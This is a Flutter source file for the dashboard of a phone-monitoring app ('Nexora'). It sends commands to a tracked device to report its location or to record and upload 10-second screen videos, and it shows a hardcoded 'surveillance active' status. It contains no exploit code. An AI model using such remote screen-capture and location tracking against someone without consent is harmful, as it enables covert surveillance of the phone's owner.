import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import '../services/api_service.dart';
import 'device_screen.dart';
import 'activity_screen.dart';
import 'location_screen.dart';
import 'recordings_screen.dart';
import 'settings_screen.dart';
import 'dart:async';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  int _i = 0;
  final _screens = const [DashboardModern(), DeviceScreen(), ActivityScreen(), LocationScreen(), RecordingsScreen(), SettingsScreen()];

  @override Widget build(BuildContext context) {
    return Scaffold(
      body: _screens[_i],
      bottomNavigationBar: NavigationBar(
        selectedIndex: _i,
        onDestinationSelected: (i) => setState(() => _i = i),
        destinations: const [
          NavigationDestination(icon: Icon(Icons.dashboard_rounded), label: 'Accueil'),
          NavigationDestination(icon: Icon(Icons.phone_android_rounded), label: 'Appareil'),
          NavigationDestination(icon: Icon(Icons.bar_chart_rounded), label: 'Activité'),
          NavigationDestination(icon: Icon(Icons.location_on_rounded), label: 'Position'),
          NavigationDestination(icon: Icon(Icons.videocam_rounded), label: 'Vidéos'),
          NavigationDestination(icon: Icon(Icons.settings_rounded), label: 'Réglages'),
        ],
      ),
    );
  }
}

class DashboardModern extends StatefulWidget {
  const DashboardModern({super.key});
  @override State<DashboardModern> createState() => _DashboardModernState();
}

class _DashboardModernState extends State<DashboardModern> {
  Map<String, dynamic>? _device;
  bool _loading = true;
  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _load();
    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => _load());
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _load() async {
    try {
      final devices = await context.read<ApiService>().get('/devices');
      if (devices.isNotEmpty) setState(() => _device = devices[0]);
    } catch (_) {}
    if (mounted && _loading) setState(() => _loading = false);
  }

  Future<void> _requestScreen() async {
    if (_device == null) return;
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("📡 Demande envoyée... MIRO va filmer pendant 10s.")));
    
    // Envoi de la commande au serveur
    await context.read<ApiService>().post('/miro/heartbeat', {'deviceId': _device!['deviceId'], 'status': 'request_screen'});
    
    // Attente réelle de 15 secondes (10s film + 5s upload)
    await Future.delayed(const Duration(seconds: 15));
    
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
        content: Text("✅ Vidéo reçue ! Appuyez sur l'onglet 'Vidéos' en bas."),
        backgroundColor: Colors.green,
        duration: const Duration(seconds: 5),
      ));
    }
  }

  Future<void> _forceLocation() async {
    if (_device == null) return;
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("📍 Demande de position envoyée...")));
    await context.read<ApiService>().post('/miro/heartbeat', {'deviceId': _device!['deviceId'], 'status': 'request_location'});
    await Future.delayed(const Duration(seconds: 3));
    _load();
  }

  @override
  Widget build(BuildContext context) {
    final isOnline = _device?['status'] == 'online';
    final lastSeen = _device?['lastSeenAt'];
    final isRecentlyActive = lastSeen != null && DateTime.now().difference(DateTime.parse(lastSeen)).inSeconds < 45;
    final finalIsOnline = isOnline || isRecentlyActive;

    return Scaffold(
      backgroundColor: Colors.grey[50],
      appBar: AppBar(title: const Text("Nexora", style: TextStyle(fontWeight: FontWeight.bold)), backgroundColor: Colors.transparent, elevation: 0, foregroundColor: Colors.black87),
      body: RefreshIndicator(onRefresh: _load, child: ListView(padding: const EdgeInsets.all(16), children: [
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(gradient: LinearGradient(colors: finalIsOnline ? [Colors.indigo, Colors.blue] : [Colors.grey, Colors.grey]), borderRadius: BorderRadius.circular(20), boxShadow: [BoxShadow(color: Colors.indigo.withOpacity(0.3), blurRadius: 10, offset: const Offset(0, 5))]),
          child: Row(children: [
            Container(padding: const EdgeInsets.all(12), decoration: BoxDecoration(color: Colors.white24, shape: BoxShape.circle), child: Icon(finalIsOnline ? Icons.check_circle : Icons.cloud_off, color: Colors.white, size: 30)),
            const SizedBox(width: 16),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(_device?['name'] ?? "Aucun appareil", style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
              const SizedBox(height: 4),
              Text(finalIsOnline ? "En ligne • Synchronisé" : "Hors ligne • En attente", style: const TextStyle(color: Colors.white70)),
            ])
          ]),
        ),
        const SizedBox(height: 24),
        const Text("Actions Rapides", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
        const SizedBox(height: 12),
        GridView.count(shrinkWrap: true, physics: const NeverScrollableScrollPhysics(), crossAxisCount: 2, crossAxisSpacing: 12, mainAxisSpacing: 12, childAspectRatio: 1.5, children: [
          _ActionCard(icon: Icons.location_searching, label: "Localiser", color: Colors.red, onTap: _forceLocation),
          _ActionCard(icon: Icons.analytics, label: "Rapport", color: Colors.orange, onTap: () => _sendCommand('report')),
          _ActionCard(icon: Icons.videocam, label: "Voir Écran", color: Colors.purple, onTap: _requestScreen),
          _ActionCard(icon: Icons.refresh, label: "Sync", color: Colors.teal, onTap: _load),
        ]),
        const SizedBox(height: 24),
        const Text("Dernières Activités", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
        const SizedBox(height: 12),
        Card(elevation: 2, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)), child: ListTile(leading: CircleAvatar(backgroundColor: Colors.indigo[50], child: Icon(Icons.info, color: Colors.indigo)), title: const Text("Système"), subtitle: const Text("Surveillance active sur 2 téléphones."), trailing: const Icon(Icons.check_circle, color: Colors.green))),
      ])),
    );
  }

  Future<void> _sendCommand(String type) async {
    if (_device == null) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Demande envoyée à ${_device!['name']}...")));
    await context.read<ApiService>().post('/miro/heartbeat', {'deviceId': _device!['deviceId'], 'status': 'syncing'});
    await Future.delayed(const Duration(seconds: 2));
    _load();
  }
}

class _ActionCard extends StatelessWidget {
  final IconData icon; final String label; final Color color; final VoidCallback onTap;
  const _ActionCard({required this.icon, required this.label, required this.color, required this.onTap});
  @override Widget build(BuildContext context) {
    return InkWell(onTap: onTap, borderRadius: BorderRadius.circular(16), child: Container(decoration: BoxDecoration(color: Colors.white, borderRadius: BorderRadius.circular(16), boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.05), blurRadius: 5)]), child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: color.withOpacity(0.1), shape: BoxShape.circle), child: Icon(icon, color: color)), const SizedBox(height: 8), Text(label, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13))])));
  }
}